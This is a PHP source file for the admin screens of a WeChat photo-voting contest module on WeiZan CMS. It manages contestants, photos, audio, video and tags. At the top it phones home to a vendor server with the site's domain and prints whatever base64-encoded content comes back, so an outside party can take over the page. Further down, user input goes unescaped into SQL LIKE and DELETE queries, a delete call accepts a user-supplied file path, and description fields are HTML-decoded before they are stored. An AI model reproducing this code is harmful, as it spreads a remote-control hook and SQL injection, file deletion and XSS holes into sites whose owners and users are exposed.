<?php
/**
 * 女神来了模块定义
 *
 * @author 微赞科技
 * @url http://bbs.012wz.com/
 */
defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
load()->func('tpl');

		$rdisplay = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_display)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$rvote = pdo_fetch("SELECT * FROM ".tablename($this->table_reply_vote)." WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$reply = array_merge($rdisplay, $rvote);
		$regtitlearr = iunserializer($rdisplay['regtitlearr']);
		$foo = !empty($_GPC['foo']) ? $_GPC['foo'] : 'display';
		$now = time();
		if ($foo == 'display') {

			if ($_GPC['sh'] == 1) {
				$status = intval($_GPC['status']);
				$from_user = $_GPC['from_user'];

				pdo_update($this->table_users, array('status' => $status, 'lasttime' => $now), array('from_user' => $from_user, 'rid' => $rid));
				$this->sendMobileHsMsg($from_user, $rid, $uniacid);
				message('审核通过成功！',referer(),'success');
			}
			if (checksubmit('delete')) {
				pdo_delete($this->table_users, " id IN ('".implode("','", $_GPC['select'])."')");
				message('删除成功！', create_url('site/module', array('do' => 'Provevote', 'name' => 'fm_photosvote', 'rid' => $rid, 'page' => $_GPC['page'], 'foo' => 'display')));
			}
			$where = '';
			//!empty($_GPC['keywordnickname']) && $where .= " AND nickname LIKE '%{$_GPC['keywordnickname']}%'";
			if (!empty($_GPC['keyword'])) {
				$keyword = $_GPC['keyword'];
				if (is_numeric($keyword))
					$where .= " AND uid = '".$keyword."'";
				else
					$where .= " AND nickname LIKE '%{$keyword}%'";

			}
			$now = time();
			$starttime = empty($_GPC['time']['start']) ?  strtotime(date("Y-m-d H:i", $now - 604799)) : strtotime($_GPC['time']['start']);
			$endtime = empty($_GPC['time']['end']) ?  strtotime(date("Y-m-d H:i", $now)) : strtotime($_GPC['time']['end']);
			if (!empty($_GPC['time']['start']) && !empty($_GPC['time']['end'])) {
				$where .= " AND createtime >= " . $starttime;
				$where .= " AND createtime < " . $endtime;
			}
			if (!empty($_GPC['votepay'])) {
				if ($_GPC['votepay'] == 1) {
					$where .= " AND ordersn <> ''";
				}else{
					$where .= " AND ordersn = ''";
				}
			}
			//!empty($_GPC['keywordid']) && $where .= " AND rid = '{$_GPC['keywordid']}'";

			$where .= " AND status <> '1'";

			$pindex = max(1, intval($_GPC['page']));
			$psize = 15;

			//取得用户列表
			$list_praise = pdo_fetchall('SELECT * FROM '.tablename($this->table_users).' WHERE rid= :rid '.$where.$uni.' order by `uid` desc LIMIT ' . ($pindex - 1) * $psize . ',' . $psize, array(':rid' => $rid) );
			$total = pdo_fetchcolumn('SELECT COUNT(1) FROM '.tablename($this->table_users).' WHERE rid= :rid '.$where.$uni.' ', array(':rid' => $rid));
			$pager = pagination($total, $pindex, $psize);
			$sharenum = array();
			foreach ($list_praise as $mid => $m) {
				$sharenum[$mid] = pdo_fetchcolumn("SELECT COUNT(1) FROM ".tablename($this->table_data)." WHERE tfrom_user = :tfrom_user and rid = :rid ".$uni."", array(':tfrom_user' => $m['from_user'],':rid' => $rid)) + pdo_fetchcolumn("SELECT COUNT(1) FROM ".tablename($this->table_data)." WHERE fromuser = :fromuser and rid = :rid ".$uni."", array(':fromuser' =>$m['from_user'], ':rid' => $rid)) + $m['sharenum'];
			}


			//include $this->template('web/provevote');
		} elseif ($foo == 'post') {

			$from_user = $_GPC['from_user'];

			if (!empty($rid)) {
				$item = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
				$uid = pdo_fetch("SELECT uid FROM ".tablename($this->table_users)." WHERE rid = :rid ORDER BY uid DESC, id DESC LIMIT 1", array(':rid' => $rid));
			}
			$level = intval($this->fmvipleavel($rid, $uniacid, $from_user));
			$fmimage = $this->getpicarr($uniacid,$rid, $item['from_user'],1);
			$picarrs =  pdo_fetchall("SELECT * FROM ".tablename($this->table_users_picarr)." WHERE from_user = :from_user AND rid = :rid ORDER BY isfm DESC", array(':from_user' => $item['from_user'],':rid' => $rid));
			$photosarrid = pdo_fetch("SELECT id FROM ".tablename($this->table_users_picarr)." WHERE rid = :rid ORDER BY id DESC LIMIT 1", array(':rid' => $rid));
			$mid = $photosarrid['id'] + 1;
			$addmid = $mid + 1;
			$photosarrnum = pdo_fetchcolumn("SELECT COUNT(1) FROM ".tablename($this->table_users_picarr)." WHERE from_user = :from_user and rid = :rid", array(':from_user' => $from_user,':rid' => $rid));

			if ($_GPC['delete']) {
				$photo = pdo_fetch("SELECT id,isfm, photoname FROM ".tablename($this->table_users_picarr)." WHERE from_user = :from_user AND rid = :rid AND id = :id", array(':from_user' => $from_user,':rid' => $rid,':id' => $_GPC['photoid']));
				if (empty($photo)) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '未找到你要删除的图片',
					);
					echo json_encode($fmdata);
					exit();
				}
				if ($photo['isfm']) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '该图片目前作为投票封面使用,请设置其他图片作为投票封面.然后再删除',
					);
					echo json_encode($fmdata);
					exit();
				}
				load()->func('file');
				$updir = '../attachment/images/'.$uniacid.'/'.date("Y").'/'.date("m").'/'.$photo['photoname'];
				file_delete($updir);
				pdo_delete($this->table_users_picarr, array('id' => intval($_GPC['photoid']), 'rid' => $rid, 'from_user' => $from_user));

				$fmdata = array(
					"success" => 1,
					"flag" => 1,
					"lastmid" => $photosarrid,
					"addlastmid" => $mid,
					"photosarrnum" => $photosarrnum,
					"msg" => '删除成功'
				);
				echo json_encode($fmdata);
				exit();
			}
			if ($_GPC['deletev']) {
				$vedio = pdo_fetch("SELECT id, vedio FROM ".tablename($this->table_users)." WHERE from_user = :from_user AND rid = :rid AND vedio = :vedio", array(':from_user' => $from_user,':rid' => $rid,':vedio' => $_GPC['vedio']));
				if (empty($vedio)) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '未找到你要删除的视频',
					);
					echo json_encode($fmdata);
					exit();
				}
				load()->func('file');
				$updir = '../attachment/audios/'.$uniacid.'/'.date("Y").'/'.date("m").'/'.$vedio['vedio'];
				file_delete($updir);
				pdo_update($this->table_users, array('vedio' => ''), array('id' => intval($vedio['id']), 'rid' => $rid, 'from_user' => $from_user));

				$fmdata = array(
					"success" => 1,
					"flag" => 1,
					"mid" => $vedio['id'],
					"msg" => '删除成功'
				);
				echo json_encode($fmdata);
				exit();
			}
			if ($_GPC['deletem']) {
				$music = pdo_fetch("SELECT id, music FROM ".tablename($this->table_users)." WHERE from_user = :from_user AND rid = :rid AND music = :music", array(':from_user' => $from_user,':rid' => $rid,':music' => $_GPC['music']));
				if (empty($music)) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '未找到你要删除的音频',
					);
					echo json_encode($fmdata);
					exit();
				}
				load()->func('file');
				$updir = '../attachment/audios/'.$uniacid.'/'.date("Y").'/'.date("m").'/'.$music['music'];
				file_delete($updir);
				pdo_update($this->table_users, array('music' => ''), array('id' => intval($music['id']), 'rid' => $rid, 'from_user' => $from_user));

				$fmdata = array(
					"success" => 1,
					"flag" => 1,
					"mid" => $music['id'],
					"msg" => '删除成功'
				);
				echo json_encode($fmdata);
				exit();
			}
			if ($_GPC['setfm']) {

				$photo = pdo_fetch("SELECT id,isfm, photoname FROM ".tablename($this->table_users_picarr)." WHERE from_user = :from_user AND rid = :rid AND id = :id", array(':from_user' => $from_user,':rid' => $rid,':id' => $_GPC['photoid']));

				if (empty($photo)) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '未找到你要设置封面的图片',
					);
					echo json_encode($fmdata);
					exit();
				}
				if ($photo['isfm']) {
					$fmdata = array(
						"success" => -1,
						"flag" => -1,
						"msg" => '该图片已经是投票封面,请设置其他图片作为投票封面。',
					);
					echo json_encode($fmdata);
					exit();
				}
				foreach ($picarrs as $key => $value) {
					if ($value['isfm'] == 1) {
						$delmid = $value['id'];
					}
					pdo_update($this->table_users_picarr,array('isfm' => 0), array('id' => intval($value['id'])));
				}
				pdo_update($this->table_users_picarr,array('isfm' => 1), array('id' => intval($_GPC['photoid']), 'rid' => $rid, 'from_user' => $from_user));

				$fmdata = array(
					"success" => 1,
					"flag" => 1,
					"lastmid" => $photosarrid,
					"addlastmid" => $mid,
					"delmid" => $delmid,
					"msg" => '设置成功！'
				);
				echo json_encode($fmdata);
				exit();
			}

			$sharesn = pdo_fetchcolumn("SELECT COUNT(1) FROM ".tablename($this->table_data)." WHERE tfrom_user = :tfrom_user and rid = :rid", array(':tfrom_user' => $from_user,':rid' => $rid)) + pdo_fetchcolumn("SELECT COUNT(1) FROM ".tablename($this->table_data)." WHERE fromuser = :fromuser and rid = :rid", array(':fromuser' =>$from_user, ':rid' => $rid)) + $item['sharenum'];
			if (checksubmit('fileupload-delete')) {
				file_delete($_GPC['fileupload-delete']);
				pdo_update($this->table_users, array('photo' => ''), array('rid' => $rid, 'from_user' => $from_user));
				message('删除成功！', referer(), 'success');
			}
			if (checksubmit('submit')) {
				if ($item['uid']) {
					if ($item['uid'] != $_GPC['uid']) {
						$yuid = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE uid = :uid and rid = :rid", array(':uid' => $_GPC['uid'],':rid' => $rid));
						if(!empty($yuid)) {
							message('非常抱歉，此ID已经存在，你需要更换其他ID！');

						}
					}
				}else{
					$yuid = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE uid = :uid and rid = :rid", array(':uid' => $_GPC['uid'],':rid' => $rid));
						if(!empty($yuid)) {
							message('非常抱歉，此ID已经存在，你需要更换其他ID！');

						}
				}
				if (empty($_GPC['nickname'])) {
					message('您的昵称没有填写，请填写！');

				}
				if ($item['nickname']) {
					if ($item['nickname'] != $_GPC['nickname']) {
						$nickname = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE nickname = :nickname and rid = :rid", array(':nickname' => $_GPC['nickname'],':rid' => $rid));
						if (!empty($nickname)) {
							message('您的昵称已经参赛，请重新填写！');

						}
					}
				}else{
					$nickname = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE nickname = :nickname and rid = :rid", array(':nickname' => $_GPC['nickname'],':rid' => $rid));
					if (!empty($nickname)) {
						message('您的昵称已经参赛，请重新填写！');

					}
				}

				if($reply['isrealname']){
					if (empty($_GPC['realname'])) {
						message('您的真实姓名没有填写，请填写！');

					}
					if ($item['realname']) {
						if ($item['realname'] != $_GPC['realname']) {
							$realname = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE realname = :realname and rid = :rid", array(':realname' => $_GPC['realname'],':rid' => $rid));
							if (!empty($realname)) {
								message('您的真实姓名已经参赛，请重新填写！');

							}
						}
					}else{
						$realname = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE realname = :realname and rid = :rid", array(':realname' => $_GPC['realname'],':rid' => $rid));
						if (!empty($realname)) {
							message('您的真实姓名已经参赛，请重新填写！');

						}
					}
				}

				if($reply['ismobile']){
					if(!preg_match(REGULAR_MOBILE, $_GPC['mobile'])) {
						message('必须输入手机号，格式为 11 位数字。');
					}
					if ($item['mobile']) {
						if ($item['mobile'] != $_GPC['mobile']) {
							$ymobile = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE mobile = :mobile and rid = :rid", array(':mobile' => $_GPC['mobile'],':rid' => $rid));
							if(!empty($ymobile)) {
								message('非常抱歉，此手机号码已经被注册，你需要更换注册手机号！');
							}
						}
					}else{
						$ymobile = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE mobile = :mobile and rid = :rid", array(':mobile' => $_GPC['mobile'],':rid' => $rid));
						if(!empty($ymobile)) {
							message('非常抱歉，此手机号码已经被注册，你需要更换注册手机号！');
						}
					}
				}

				preg_match('/[a-zA-z]+:\/\/[^\s]*/', $_GPC["youkuurl"], $matchs);
				$tyurl = str_replace("&quot;", '', $matchs[0]);
				//print_r($_GPC['category']);
				//exit;
				$data = array(
					'uid' => empty($_GPC['uid']) ? $uid['uid']+ 1 : intval($_GPC['uid']),
					'tagid' => $_GPC['category']['childid'],
					'tagpid' => $_GPC['category']['parentid'],
					'tagtid' => $_GPC['category']['threecs'],
					'sex' => intval($_GPC['sex']),
					'avatar' => $_GPC['avatar'],
					'youkuurl'  => $tyurl,
					'nickname'  => $_GPC["nickname"],
					'realname'  => $_GPC["realname"],
					'mobile'  => $_GPC["mobile"],
					'weixin'  => $_GPC["weixin"],
					'qqhao'  => $_GPC["qqhao"],
					'email'  => $_GPC["email"],
					'job'  => $_GPC["job"],
					'xingqu'  => $_GPC["xingqu"],
					'address'  => $_GPC["address"],
					'photosnum' => intval($_GPC['photosnum']),
					'xnphotosnum' => intval($_GPC['xnphotosnum']),
					'hits' => intval($_GPC['hits']),
					'xnhits' => intval($_GPC['xnhits']),
					'sharenum' => intval($_GPC['sharenum']),
					'zans' => intval($_GPC['zans']),
					'lastip' => getip(),
					'lasttime' => $now,
					'status' => empty($_GPC['status']) ? 2 : intval($_GPC['status']),
					'description'  =>  htmlspecialchars_decode($_GPC['description']),
					'photoname'  => htmlspecialchars_decode($_GPC["photoname"]),
				);
				if (!empty($_GPC['jifen'])) {
					$this->editjifen($rid, $from_user,$_GPC['jifen'],$_GPC["nickname"],$_GPC['avatar'],$_GPC["realname"],$_GPC["mobile"],intval($_GPC['sex']));
				}
				$item = pdo_fetch("SELECT * FROM ".tablename($this->table_users)." WHERE rid = :rid AND from_user = :from_user" , array(':rid' => $rid, ':from_user' => $from_user));
				if (empty($item)) {
					$data['from_user'] = $from_user;
					$data['rid'] = $rid;
					$data['createtime'] = $now;
					$data['createip'] = getip();
					$data['uniacid'] = intval($uniacid);
					pdo_insert($this->table_users, $data);
					pdo_update($this->table_reply_display, array('csrs_total' => $reply['csrs_total']+1, 'cyrs_total' => $reply['cyrs_total']+intval($_GPC['hits']),'xuninum' => $reply['xuninum']+intval($_GPC['xnhits']), 'xunips' => $reply['xunips']+intval($_GPC['xnphotosnum']), 'ljtp_total' => $reply['ljtp_total']+intval($_GPC['photosnum'])), array('rid' => $rid));
					message('成功添加一位参赛选手', referer(), 'success');
				}else{
					load()->func('communication');
					if (!empty($item['music'])) {
						$geitime = ihttp_get($item['music'].'?avinfo');
						$t = @json_decode($geitime['content'], true);
						$data['musictime'] = $t['format']['duration'];
					}

					if (!empty($item['voice'])) {
						$geitime = ihttp_get($item['voice'].'?avinfo');
						$t = @json_decode($geitime['content'], true);
						$data['voicetime'] = $t['format']['duration'];
					}
					if (!empty($item['vedio'])) {
						$geitime = ihttp_get($item['vedio'].'?avinfo');
						$t = @json_decode($geitime['content'], true);
						$data['vediotime'] = $t['format']['duration'];
					}

					pdo_update($this->table_users, $data, array('rid' => $rid, 'from_user' => $from_user));
					pdo_update($this->table_reply_display, array('cyrs_total' => $reply['cyrs_total']+intval($_GPC['hits']),'xuninum' => $reply['xuninum']+intval($_GPC['xnhits']), 'xunips' => $reply['xunips']+intval($_GPC['xnphotosnum']), 'ljtp_total' => $reply['ljtp_total']+intval($_GPC['photosnum']) ), array('rid' => $rid));//增加总投票 总人气
					if ($_GPC['member'] == '1') {
						message('报名用户更新成功！', $this->createWebUrl('members', array('rid' => $rid, 'foo' => 'display')), 'success');
					}else {
						message('报名用户更新成功！', $this->createWebUrl('provevote', array('rid' => $rid, 'foo' => 'display')), 'success');
					}
				}


			}
			$tagid = $item['tagid'];
			$tagpid = $item['tagpid'];
			$tagtid = $item['tagtid'];
			$tagname = $this->gettagname($tagid,$tagpid,$tagtid,$rid);
			load()->func('tpl');
			$tags = pdo_fetchall("SELECT id,parentid,title FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' ORDER BY parentid ASC, displayorder ASC, id ASC ", array(), 'id');
			$parent = array();
			$children = array();

			if (!empty($tags)) {
				$children = '';
				foreach ($tags as $cid => $cate) {
					$cate['name'] = $cate['title'];
					if (!empty($cate['parentid'])) {
						$children[$cate['parentid']][] = $cate;
					} else {
						$parent[$cate['id']] = $cate;
					}
				}
			}
			$jifen = $this->cxjifen($rid, $from_user);
		} elseif ($foo == 'pnametag') {
			if (checksubmit('submit')) {
				if (!empty($_GPC['title'])) {
					foreach ($_GPC['title'] as $index => $row) {
						$data = array(
							'title' => $_GPC['title'][$index],
							'rid' => $rid,
							'createtime' => time(),
						);
						if(!empty($data['title'])) {
							if(pdo_fetch("SELECT id FROM ".tablename($this->table_pnametag)." WHERE title = :title AND id != :id", array(':title' => $data['title'], ':id' => $index))) {
								continue;
							}

							$row = pdo_fetch("SELECT id FROM ".tablename($this->table_pnametag)." WHERE title = :title AND rid = :rid  LIMIT 1",array(':title' => $data['title'],':rid' => $rid));
							if(empty($row)) {
								pdo_update($this->table_pnametag, $data, array('id' => $index));
							}
							unset($row);
						}
					}
				}
				if (!empty($_GPC['title-new'])) {
					foreach ($_GPC['title-new'] as $index => $row) {
						$data = array(
								'uniacid' => $uniacid,
								'rid' => $rid,
								'title' => $_GPC['title-new'][$index],
								'createtime' => time(),
						);
						if(!empty($data['title'])) {
							if(pdo_fetch("SELECT id FROM ".tablename($this->table_pnametag)." WHERE title = :title", array(':title' => $data['title']))) {
								continue;
							}
							pdo_insert($this->table_pnametag, $data);
							unset($row);
						}
					}
				}

				if (!empty($_GPC['delete'])) {
					pdo_query("DELETE FROM ".tablename($this->table_pnametag)." WHERE id IN (".implode(',', $_GPC['delete']).")");
				}

				message('更新成功！', referer(), 'success');
			}
			$list = pdo_fetchall("SELECT * FROM ".tablename($this->table_pnametag)." WHERE rid = :rid  ".$uni." ORDER BY id DESC", array( ':rid' => $rid));
		}

		include $this->template('web/provevote');
